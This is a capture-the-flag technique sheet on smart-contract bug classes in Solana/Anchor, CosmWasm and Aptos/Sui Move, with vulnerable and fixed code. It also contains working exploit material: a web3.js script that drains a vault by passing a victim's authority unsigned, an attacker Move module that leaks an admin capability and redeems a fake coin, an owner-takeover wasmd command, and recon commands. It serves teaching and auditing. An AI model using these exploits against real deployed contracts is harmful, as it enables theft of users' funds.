---
title: "Non-EVM Chains - Solana, Cosmos and Move Bug Classes"
category: blockchain
subcategory: non-evm
type: technique
tags: [blockchain, solana, anchor, cosmos, cosmwasm, move, aptos, sui, account-validation, signer-check, owner-check, pda, cpi, type-cosplay, rust, borsh, resource, capability, non-evm]
difficulty: hard
summary: "Solana bugs are missing account checks, Cosmos bugs are missing sender checks and unbounded iteration, Move bugs are capability and generic-type confusion."
when_to_use:
  - "The challenge is a Solana/Anchor program, a CosmWasm contract, or a Move module"
  - "You see Rust with AccountInfo, Context<T>, or #[account]"
  - "You see execute(deps, env, info, msg) with a match on an enum"
  - "You see public entry fun, acquires, or a struct with key/store abilities"
tools: [solana-cli, anchor, cargo, wasmd, aptos-cli, sui]
related: [access-control, reentrancy, integer-overflow, solidity-vuln-checklist]
---

## TL;DR

Outside the EVM the *attack surface moves*. Solana passes every account in explicitly, so the bug
is a missing check on one of them. Cosmos gives you a typed message router, so the bug is a missing
`info.sender` comparison. Move has linear resources that cannot be copied or dropped, so the bug is
almost always a capability handed to the wrong caller or a generic type parameter you get to choose.

## Recognise it

**Solana / Anchor**
- `AccountInfo<'info>` used without `#[account(...)]` constraints, or `UncheckedAccount`.
- No `Signer<'info>` on the authority account.
- Missing `has_one = authority` / `constraint = ...` / `seeds = [...] , bump`.
- `#[account(mut)]` on something that should be `init` or vice versa.
- Manual `try_from_slice` on account data without checking `owner == program_id`.
- A CPI where the `program` account is not pinned to the expected program id.
- `close = receiver` missing, or a manual close that does not zero the discriminator.

**Cosmos / CosmWasm**
- `execute()` arms that mutate config without `if info.sender != config.owner { return Err(...) }`.
- `Uint128` arithmetic without `checked_add` / `checked_sub` in a release profile with
  `overflow-checks = false`.
- Iterating an unbounded `Map` in a query or in `execute`.
- `SubMsg::reply_on_success` handlers that trust the reply payload.
- `BankMsg::Send` before state update (reentrancy is possible via submessage replies).
- Missing `must_pay` / `one_coin` validation on funds.

**Move (Aptos / Sui)**
- `public fun` that should be `public(friend)` or `entry`.
- A capability struct (`AdminCap`, `MintCapability`) that is `store`-able and transferable.
- Generic `<CoinType>` chosen by the caller and used to price or mint.
- `borrow_global_mut<T>(addr)` where `addr` comes from an argument instead of `signer::address_of`.
- Sui: an object passed by `&mut` that the caller owns but the module assumes is shared.

## Theory

### Solana: everything is an account, nothing is checked for you

A Solana instruction receives a list of accounts. The runtime checks *only*:
- signatures on accounts marked as signers,
- writability flags,
- that a program only writes to accounts it owns.

It does **not** check that the account you passed as `vault` is really the vault. That is the
program's job. Anchor's `#[derive(Accounts)]` macro generates those checks from constraints - and
every constraint you omit is a hole.

The canonical Solana bug taxonomy:

| Bug | What is missing | Exploit |
|---|---|---|
| **Missing signer check** | `Signer<'info>` or `is_signer` | pass the victim's account unsigned and act as them |
| **Missing owner check** | `owner == program_id` | pass a look-alike account owned by *your* program with fields you chose |
| **Account data matching** | `has_one = authority`, `constraint = x.key() == y.key()` | pass account A's data with account B's authority |
| **Type cosplay** | no discriminator check (hand-rolled deserialization) | pass a `UserMetadata` where a `Config` is expected; Borsh happily decodes |
| **Arbitrary CPI** | `program.key() == expected_program::ID` | supply your own program as the "token program" |
| **PDA seed collision / missing bump** | canonical `bump` not enforced | grind a non-canonical bump to forge a PDA |
| **Duplicate mutable accounts** | no `a.key() != b.key()` | pass the same account as source and destination, double-credit |
| **Closing accounts** | discriminator not zeroed + lamports not drained | revive a closed account within the same transaction |
| **`init_if_needed` reinitialization** | no state guard | re-initialize and reset admin |

### Cosmos / CosmWasm: the router is typed, the authorisation is not

```rust
pub fn execute(deps: DepsMut, env: Env, info: MessageInfo, msg: ExecuteMsg)
    -> Result<Response, ContractError>
```

`info.sender` is authenticated by the chain, so there is no spoofing - the bug is simply not
comparing it. Other recurring issues:

- **Overflow**: `Uint128` panics on overflow only if `overflow-checks = true` in `Cargo.toml`'s
  release profile. Many contracts ship without it; then `a + b` wraps.
- **Unbounded iteration**: a query that walks a `Map` with no limit can exceed the gas/time cap,
  bricking the contract.
- **Submessage reply reentrancy**: `SubMsg` replies execute *after* the bank transfer, giving a
  callback window.
- **Migration**: `migrate()` with no admin check, or a `CosmosMsg::Wasm(Migrate {..})` the contract
  can be tricked into emitting.
- **IBC**: `ibc_packet_receive` that trusts the counterparty channel without checking the port/channel.

### Move: linear types remove whole classes, capabilities create a new one

Move resources cannot be copied or implicitly discarded, so double-spend and "forgot to update the
balance" bugs largely vanish. What remains:

- **Capability leakage**: an `AdminCap` with the `store` ability can be put in a struct and
  transferred. If a `public fun` returns one, or a struct holding one is transferable, anyone can
  obtain admin rights.
- **Generic type confusion**: `public entry fun swap<A, B>(...)` where the caller picks `A` and `B`.
  If the module does not verify that the pair is registered, you pass your own worthless coin type
  as `A` and drain `B`.
- **Visibility**: `public fun` is callable by any module; `public(friend)` restricts to declared
  friends; `entry` makes it a transaction entry point. A function meant to be internal but marked
  `public` is the Move equivalent of a missing `onlyOwner`.
- **`borrow_global_mut<T>(addr)`**: if `addr` is a parameter rather than `signer::address_of(account)`,
  you mutate someone else's resource.
- **Sui object ownership**: owned vs shared vs immutable. A function taking `&mut Pool` assumes the
  pool is shared; if it is actually owned by the attacker, they control its contents.
- **Arithmetic**: Move aborts on overflow by default (`u64`, `u128`), so overflow is a DoS, not a
  bypass - but `as` casts truncate silently.

## Attack

**Solana**
1. `solana program dump <PROGRAM_ID> prog.so` and, if you have the IDL,
   `anchor idl fetch <PROGRAM_ID>`.
2. List every account of the target instruction and every constraint on it.
3. For each account with no constraint, ask "what if I pass something else?"
4. Build the transaction manually (`@solana/web3.js` or `solana_sdk` in Rust) so you can pass
   arbitrary accounts - the Anchor client would refuse.
5. For type cosplay, create an account of the wrong type whose Borsh layout aligns.

**Cosmos**
1. `wasmd query wasm contract-state all <addr>` to dump raw state.
2. Read `execute`/`query`/`migrate`/`reply` and grep for `info.sender`.
3. Craft the JSON message with `wasmd tx wasm execute`.

**Move**
1. Read the module's `public`/`entry` functions and its capability structs.
2. Check every `borrow_global_mut` for an attacker-controlled address.
3. Check every generic parameter for a missing registry/whitelist check.
4. Write a small attacker module that calls the victim's `public` functions.

## Code

### Solana / Anchor - vulnerable and fixed

```rust
// vulnerable: no signer check, no has_one, no owner check on `vault`
use anchor_lang::prelude::*;

declare_id!("Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS");

#[program]
pub mod vulnerable_vault {
    use super::*;

    pub fn withdraw(ctx: Context<Withdraw>, amount: u64) -> Result<()> {
        // BUG 1: ctx.accounts.authority is AccountInfo, not Signer -> anyone can pass
        //        the real owner's pubkey without signing.
        // BUG 2: no `has_one = authority` tying the vault to the authority.
        let vault = &mut ctx.accounts.vault;
        vault.balance = vault.balance.checked_sub(amount).ok_or(ErrorCode::Underflow)?;

        **ctx.accounts.vault.to_account_info().try_borrow_mut_lamports()? -= amount;
        **ctx.accounts.destination.try_borrow_mut_lamports()? += amount;
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(mut)]
    pub vault: Account<'info, Vault>,
    /// CHECK: BUG -- unchecked and unsigned
    pub authority: AccountInfo<'info>,
    /// CHECK: BUG -- arbitrary destination
    #[account(mut)]
    pub destination: AccountInfo<'info>,
}

#[account]
pub struct Vault {
    pub authority: Pubkey,
    pub balance: u64,
}

#[error_code]
pub enum ErrorCode {
    #[msg("arithmetic underflow")]
    Underflow,
}
```

```rust
// fixed
#[derive(Accounts)]
pub struct Withdraw<'info> {
    #[account(
        mut,
        has_one = authority,                       // vault.authority == authority.key()
        seeds = [b"vault", authority.key().as_ref()],
        bump = vault.bump,                         // canonical bump, stored at init
    )]
    pub vault: Account<'info, Vault>,
    pub authority: Signer<'info>,                  // must actually sign
    #[account(mut, constraint = destination.key() == vault.authority)]
    pub destination: SystemAccount<'info>,
}
```

### Solana - type cosplay

```rust
// Hand-rolled deserialization with no discriminator check.
// Anchor prepends an 8-byte discriminator = sha256("account:<StructName>")[..8];
// skipping it means any account whose bytes happen to parse is accepted.
pub fn admin_only(ctx: Context<AdminOnly>) -> Result<()> {
    // BUG: try_from_slice on raw data, no owner check, no discriminator check
    let data = ctx.accounts.config.try_borrow_data()?;
    let config = Config::try_from_slice(&data)?;          // <-- accepts ANY 40-byte account
    require_keys_eq!(config.admin, ctx.accounts.signer.key(), ErrorCode::NotAdmin);
    Ok(())
}

// Attacker: create a UserProfile account (owned by a program they control, or even a
// plain system account they funded) whose first 32 bytes are their own pubkey, and
// pass it as `config`.
#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct Config { pub admin: Pubkey, pub fee_bps: u64 }

#[derive(AnchorSerialize, AnchorDeserialize)]
pub struct UserProfile { pub owner: Pubkey, pub points: u64 }   // identical layout
```

Building the malicious transaction (the Anchor client will not let you, so go raw):

```javascript
// @solana/web3.js -- pass arbitrary accounts in arbitrary order
import { Connection, Keypair, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
import { sha256 } from "@noble/hashes/sha256";

const conn = new Connection(process.env.RPC_URL ?? "http://127.0.0.1:8899", "confirmed");
const me = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(process.env.KEY)));
const PROGRAM = new PublicKey(process.env.PROGRAM_ID);

// anchor instruction discriminator = sha256("global:<snake_case_name>")[0..8]
const disc = Buffer.from(sha256("global:withdraw")).subarray(0, 8);
const amount = Buffer.alloc(8);
amount.writeBigUInt64LE(1_000_000_000n);

const ix = new TransactionInstruction({
  programId: PROGRAM,
  keys: [
    { pubkey: new PublicKey(process.env.VAULT), isSigner: false, isWritable: true },
    // the victim's authority -- NOT signed, which the vulnerable program never checks
    { pubkey: new PublicKey(process.env.VICTIM_AUTHORITY), isSigner: false, isWritable: false },
    { pubkey: me.publicKey, isSigner: false, isWritable: true },
  ],
  data: Buffer.concat([disc, amount]),
});

const tx = new Transaction().add(ix);
const sig = await conn.sendTransaction(tx, [me]);
console.log("sent", sig);
```

```bash
# useful solana CLI recon
solana config set --url "$RPC_URL"
solana account "$VAULT" --output json           # raw account data + owner
solana program dump "$PROGRAM_ID" program.so    # the compiled BPF/SBF ELF
anchor idl fetch "$PROGRAM_ID" > idl.json       # if the IDL was published on-chain
solana logs "$PROGRAM_ID"                       # live program logs
solana-test-validator --reset                   # local chain for testing
```

### CosmWasm - vulnerable and fixed

```rust
// vulnerable execute arm
use cosmwasm_std::{DepsMut, Env, MessageInfo, Response, StdError, Uint128};

pub fn execute_set_owner(
    deps: DepsMut,
    _env: Env,
    _info: MessageInfo,           // BUG: info.sender never consulted
    new_owner: String,
) -> Result<Response, StdError> {
    let mut cfg = CONFIG.load(deps.storage)?;
    cfg.owner = deps.api.addr_validate(&new_owner)?;
    CONFIG.save(deps.storage, &cfg)?;
    Ok(Response::new().add_attribute("action", "set_owner"))
}

// fixed
pub fn execute_set_owner_fixed(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    new_owner: String,
) -> Result<Response, StdError> {
    let mut cfg = CONFIG.load(deps.storage)?;
    if info.sender != cfg.owner {
        return Err(StdError::generic_err("unauthorized"));
    }
    cfg.owner = deps.api.addr_validate(&new_owner)?;
    CONFIG.save(deps.storage, &cfg)?;
    Ok(Response::new().add_attribute("action", "set_owner"))
}

// arithmetic: without overflow-checks = true in [profile.release], `+` wraps
pub fn credit(balance: Uint128, amount: Uint128) -> Result<Uint128, StdError> {
    balance.checked_add(amount).map_err(|e| StdError::generic_err(e.to_string()))
}
```

```bash
# CosmWasm recon and exploitation
wasmd query wasm list-code
wasmd query wasm contract "$CONTRACT"
wasmd query wasm contract-state all "$CONTRACT" -o json        # raw kv pairs (base64)
wasmd query wasm contract-state smart "$CONTRACT" '{"config":{}}' -o json
wasmd tx wasm execute "$CONTRACT" '{"set_owner":{"new_owner":"wasm1..."}}' \
  --from attacker --gas auto --gas-adjustment 1.3 -y
# download and inspect the wasm blob
wasmd query wasm code 1 code.wasm && wasm2wat code.wasm | grep -i 'owner\|admin'
```

### Move - capability leak and generic confusion

```move
module victim::vault {
    use std::signer;

    struct AdminCap has key, store {}          // BUG: `store` makes it transferable
    struct Vault<phantom CoinType> has key { total: u64 }

    /// BUG: `public` (callable by any module) and returns the capability by value
    public fun mint_admin_cap(_account: &signer): AdminCap {
        AdminCap {}
    }

    /// BUG: CoinType is chosen by the caller and never checked against a registry
    public entry fun redeem<CoinType>(account: &signer, amount: u64) acquires Vault {
        let v = borrow_global_mut<Vault<CoinType>>(@victim);
        v.total = v.total - amount;
        // ... pays out `amount` of the REAL reserve regardless of CoinType
        let _ = signer::address_of(account);
    }

    /// BUG: address comes from an argument, not from the signer
    public entry fun set_total(_account: &signer, owner: address, total: u64) acquires Vault {
        let v = borrow_global_mut<Vault<u64>>(owner);
        v.total = total;
    }
}

module attacker::exploit {
    use victim::vault;

    struct FakeCoin has store {}

    public entry fun run(account: &signer) {
        // 1) obtain the capability that should never have been public
        let _cap = vault::mint_admin_cap(account);
        // 2) redeem against a worthless generic type
        vault::redeem<FakeCoin>(account, 1_000_000);
    }
}
```

```bash
# Aptos
aptos move compile --package-dir .
aptos move publish --package-dir . --profile attacker
aptos move run --function-id "$ATTACKER::exploit::run" --profile attacker
aptos account list --query resources --account "$VICTIM"
aptos move view --function-id "$VICTIM::vault::total"

# Sui
sui move build
sui client publish --gas-budget 100000000
sui client call --package "$PKG" --module exploit --function run --gas-budget 10000000
sui client object "$OBJECT_ID"        # owner field: AddressOwner / Shared / Immutable
```

## Variants & pitfalls

- **Solana has no reentrancy in the EVM sense** - CPI depth is limited to 4 and a program cannot
  re-enter itself except at depth 1 (self-recursion is allowed only directly). The equivalent bug is
  *account state read before a CPI that mutates it*.
- **Solana rent and account closing**: an account closed by draining lamports is only *really* gone
  at the end of the transaction. Within the same transaction, a "revival" attack re-funds it.
  Anchor's `close` constraint also writes a `CLOSED_ACCOUNT_DISCRIMINATOR`; hand-rolled closes
  usually do not.
- **Anchor `init_if_needed`** is a footgun: it must be paired with a state check or it becomes a
  reinitialization primitive.
- **Bump seeds**: `find_program_address` returns the *canonical* (highest valid) bump. If a program
  accepts any bump the caller supplies, several distinct PDAs map to "the same" logical account.
- **CosmWasm gas metering** makes unbounded loops a real DoS; `Order::Ascending` range scans with
  no `.take(n)` are the smell.
- **Cosmos `overflow-checks`**: check `Cargo.toml`'s `[profile.release]`. Its absence is the bug.
- **Move aborts are not catchable** - there is no try/catch, so a forced abort is a clean DoS.
- **Sui vs Aptos Move differ**: Sui has an object model with `UID` and ownership; Aptos uses global
  storage keyed by address (`borrow_global`). The bug classes only partly overlap.
- **Tooling gap**: for Solana without an IDL you are reading SBF ELF. `solana program dump` plus
  `llvm-objdump -d` or a Ghidra SBF loader; often faster to fuzz the instruction discriminators.

## Tools

- Solana: `solana` CLI, `anchor`, `@solana/web3.js`, `solana-test-validator`, `sec3 x-ray`,
  `cargo-build-sbf`, `llvm-objdump`.
- Cosmos: `wasmd`, `cosmwasm-check`, `wabt` (`wasm2wat`), `cw-multi-test`.
- Move: `aptos` CLI, `sui` CLI, `move-prover`, `move disassemble`.

## References

- Anchor Book: account constraints (`has_one`, `seeds`, `bump`, `constraint`).
- Solana Program Security guidelines / the Neodyme "Solana security workshop" bug taxonomy.
- CosmWasm Book: `execute`/`query`/`migrate` entry points and `MessageInfo`.
- The Move Book: abilities (`copy`, `drop`, `store`, `key`) and visibility.
